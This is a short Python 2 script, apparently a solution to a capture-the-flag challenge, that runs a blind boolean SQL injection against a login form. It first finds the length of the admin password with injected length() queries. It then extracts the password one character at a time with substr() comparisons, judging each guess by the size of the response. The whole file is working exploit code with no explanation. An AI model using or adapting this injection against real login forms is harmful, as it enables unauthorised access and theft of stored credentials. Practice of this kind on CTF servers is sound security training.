#!/usr/bin/env python
# coding: UTF-8

import sys
import urllib
import urllib2

def httpRequest(id, pw):

	print "SELECT * FROM user WHERE id='" + id + "' AND pass=" + pw

	url = 'http://ctfq.sweetduet.info:10080/~q6/'
	req = {'id': id, 'pass': pw}
	params = urllib.urlencode(req)
	response = urllib2.urlopen(url, params)
	data = response.read()
	# print data
	# print len(data)

	return data


def length():

	for i in range(1, 100):
		id = "admin' AND (SELECT length(pass) FROM user WHERE id='admin') = " + str(i) + " ; --"
		pw = "''"
		
		data = httpRequest(id, pw)

		if len(data) > 2000:
			print "Length of pass is " + str(i)
			return i
		else:
			print str(i) + " is NG"

def atkpw(plen):

	flag = ''

	for p in range(0, plen):
		for i in range(48, 123):
			char = chr(i)
			id = "admin' AND substr((SELECT pass FROM user WHERE id='admin'), " + str(p + 1) + ", 1) = " + "'" + char + "'" + " ; --"
			pw = "''"

			data = httpRequest(id, pw)

			if len(data) > 2000:
				print str(i) + ": " + char
				flag = flag + char
				print flag
				break

	return flag



if __name__ == '__main__':
	# pass_length = length()
	plen = 21



	print atkpw(plen)
